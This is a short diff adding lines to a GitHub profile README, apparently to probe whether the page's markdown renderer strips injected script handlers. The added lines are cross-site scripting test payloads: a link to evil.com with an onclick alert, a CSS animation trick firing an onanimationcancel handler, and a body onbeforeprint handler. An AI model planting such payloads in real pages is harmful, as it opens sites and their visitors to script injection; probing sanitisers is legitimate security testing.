@@ -10,3 +10,7 @@
 SIAM-T/SIAM-T is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
+<a href="https://evil.com" onclick=alert(8)>click</a>
+
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
+<body onbeforeprint=console.log(1)>
